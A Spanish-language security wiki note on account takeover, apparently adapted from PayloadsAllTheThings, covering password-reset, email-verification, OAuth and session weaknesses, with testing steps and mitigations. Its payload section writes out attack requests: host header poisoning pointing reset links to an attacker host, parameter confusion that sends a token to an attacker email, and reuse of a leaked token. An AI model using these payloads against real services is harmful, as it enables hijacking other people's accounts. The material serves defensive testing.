---
tags:
  - seguridad-web
  - owasp
  - account-takeover
aliases:
  - Account Takeover
  - ATO
  - Apropiación de cuenta
  - Toma de control de cuenta
---

# Account Takeover

**El Account Takeover (ATO) es el resultado de encadenar una o varias debilidades para apoderarse de la cuenta de otro usuario: típicamente fallos en el restablecimiento de contraseña, en la verificación de correo, en OAuth o en la gestión de sesión.** No es una única vulnerabilidad, sino un objetivo al que llegan muchas otras.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
El atacante busca el eslabón más débil del ciclo de vida de la cuenta: el flujo de "olvidé mi contraseña" (tokens predecibles, fuga del token, host header poisoning), la verificación de email/teléfono, el enlace social ([[OAuth mal configurado]]), o la sesión ([[JWT (JSON Web Token)]] manipulable). Muchas veces basta cambiar el correo de destino, reutilizar un token, o aprovechar que el reset no invalida sesiones previas.

## Detección y pruebas
Recorre cada función relacionada con identidad y busca: tokens de reset cortos/secuenciales/sin caducidad, respuestas que filtran el token, posibilidad de cambiar el email destino, falta de verificación al cambiar correo, y si el reset/2FA invalida sesiones. Cruza con enumeración de usuarios y [[Fuerza bruta y rate limiting]].

## Explotación / payloads
**Host header poisoning en el enlace de reset** (el correo apunta al host del atacante):

```http
POST /reset-password HTTP/1.1
Host: atacante.com
X-Forwarded-Host: atacante.com

email=victima@mail.com
```

**Confusión de parámetros / mismo token a otro email:**

```
POST /reset   email=victima@mail.com&email=atacante@mail.com
POST /reset   {"email":["victima@mail.com","atacante@mail.com"]}
```

**Reutilización del token de respuesta** (la API devuelve el token):

```
# si /forgot devuelve el reset_token en la respuesta JSON, se usa directo
POST /reset/confirm   token=<robado>&password=NuevaClave1
```

**Tomar el control vía cambio de email sin re-verificar** o vía pre-account takeover (registrar el correo de la víctima antes que ella y vincularlo luego por OAuth).

## Mitigación
- Tokens de reset **largos, aleatorios, de un solo uso y con caducidad corta**; nunca exponerlos en la respuesta.
- Construir enlaces con un host de confianza fijo, no con la cabecera `Host`.
- Re-verificar al cambiar correo/teléfono; invalidar **todas** las sesiones y tokens tras un reset o cambio de credenciales.
- Aplicar rate limiting, MFA y notificación al usuario ante cambios sensibles.

## Herramientas
- **Burp Suite** (Repeater/Intruder) — manipulación de flujos de reset y tokens.
- Enumeración de usuarios + diccionarios para encadenar con fuerza bruta.

---
🔗 Relacionado: [[JWT (JSON Web Token)]] · [[Ataques SAML]] · [[OAuth mal configurado]] · [[Fuerza bruta y rate limiting]]
📚 Fuente: [PayloadsAllTheThings — Account Takeover](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover) (MIT, © Swissky)
